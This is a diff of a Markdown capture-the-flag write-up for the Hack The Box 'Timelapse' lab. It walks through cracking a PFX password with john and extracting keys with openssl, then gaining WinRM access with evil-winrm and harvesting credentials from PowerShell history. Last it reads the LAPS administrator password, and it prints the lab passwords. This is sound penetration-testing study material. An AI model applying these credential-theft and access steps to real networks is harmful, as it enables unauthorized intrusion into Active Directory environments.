@@ -14,7 +14,7 @@ tags: ["ctf", "penetration testing", "htb", "cybersecurity", "timelapse", "htb w
 	- Use *pfx3john* to convert the `.pfx` into hash format and use *john* to crack the password. 
 	- Extract the SSL certificate and private key from the `.pfx` file.
 
-## Nmap
+### Nmap
 
 ```sh
 Nmap scan report for 10.10.11.152
@@ -104,14 +104,22 @@ john -w=/usr/share/wordlists/rockyou.txt hash
 
 ![screenshot](/assets/images/timelapse4.png)
 
-The output is a PFX file which contains an SSL certificate in PKCS#12 format and a private key. PFX files can be used by WinRM in order to login without a password. Let's extract them from the file.
+The output is a PFX file that includes an SSL certificate and a private key in PKCS#12 format.
+
+PFX files allow WinRM to authenticate without requiring a password.
 
 ```sh
+# extracting SSL certificate and a private key
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
 ```
+
 ![screenshot](/assets/images/timelapse11.png)
 
-The output above shows that we need a different password than supremelegacy . Utilizing the *pfx2john* utility we convert the pfx file into a hash format then use John to crack the password. Using the following command we are able to successfully crack the password to the pfx file.
+`supremelegacy` is not the correct password. 
+
+Using the *pfx2john*, I can convert the pfx file into a hash format.
+
+Then, use *John* to crack the password. 
 
 ```sh
 python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john
@@ -121,7 +129,11 @@ john pfx.john -w=/usr/share/wordlists/rockyou.txt
 
 ![screenshot](/assets/images/timelapse12.png)
 
-Once the password is cracked we extract the SSL certificate and private key from the pfx file using the following commands.
+```text
+thuglegacy
+```
+
+I can now extract the SSL certificate and private key from the pfx file as below.
 
 ```sh
 # extract the private key from the pfx file
@@ -135,24 +147,18 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
 
 ![screenshot](/assets/images/timelapse14.png)
 
+#### LAPS_Datasheet.docx
 
-
-
-
-
-
-
-
-
-### LAPS_Datasheet.docx
 ![screenshot](/assets/images/timelapse5.png)
-### LAPS_OperationsGuide.docx
 
+#### LAPS_OperationsGuide.docx
 
-## LAPS_TechnicalSpecifications.docx
+### LAPS_TechnicalSpecifications.docx
+
 ![screenshot](/assets/images/timelapse6.png)
 
-## LDAP
+### LDAP
+
 ```sh
 ldapsearch -x -H ldap://10.10.11.152 -D '' -w '' -b "DC=timelapse,DC=htb" > tmp
 ```
@@ -165,11 +171,11 @@ cat tmp | awk '{print $1}' | sort | uniq -c | sort -nr
 ![screenshot](/assets/images/timelapse9.png)
 
 
-# Initial Access
+## Foothold
 - Evil-winrm using the certificate and private key. 
 
-## Attempts
-### Extract Keys
+### Extracting Keys
+
 ```sh
 # dump the key
 openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
@@ -182,8 +188,11 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.c
 ```
 
 ![screenshot](/assets/images/timelapse15.png)
+
 ### Evil-winrm
+
 ```sh
+#  initial try - did not work
 evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem 
 
 # this worked
@@ -193,31 +202,37 @@ evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
 ![screenshot](/assets/images/timelapse16.png)
 
 
-# Lateral Movement
-- The command line history shows new login credentials. 
+## Lateral Movement
+
+>- The command line history shows new login credentials. 
 - Evil-winrm using the obtained credentials `svc_deploy`.
-# Privilege Escalation
-- `svc_deploy` is a member of `LAPS_Readers` group.
+
+## Privilege Escalation
+>- `svc_deploy` is a member of `LAPS_Readers` group.
 - Running `Get-ADComputer DC01 -property 'ms-mcs-admpwd'` shows the password for the administrator.
 - Evil-winrm as admin. 
  
- ## Enumeration
+ ### Enumeration
+
 ```powershell
 # Read history
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
 ![screenshot](/assets/images/timelapse19.png)
-## Notes
+
 ```text
 svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
 ```
 
-## Attempts
-### WinPEAS
+#### WinPEAS
+
 Program 'peas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software.
+
 ![screenshot](/assets/images/timelapse17.png)
-## Evil-winrm as `svc_deploy`
+
+### Evil-winrm as `svc_deploy`
+
 ```sh
 evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 ```
@@ -225,16 +240,21 @@ evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 ![screenshot](/assets/images/timelapse20.png)
 
 ![screenshot](/assets/images/timelapse21.png)
+
 -> *LAPS_Readers* group. 
 
 The "Local Administrator Password Solution" (LAPS) is used to manage local account passwords of Active Directory computers. 
-### Read Password
+
+#### Read Password
+
 ```powershell
 Get-ADComputer DC01 -property 'ms-mcs-admpwd'
 ```
 
 ![screenshot](/assets/images/timelapse22.png)
+
 ## Evil-winrm as admin
+
 ```sh
 evil-winrm -i timelapse.htb -S -u administrator -p '55T{8XL047sxk(5Iv}fK3o02'
 ```
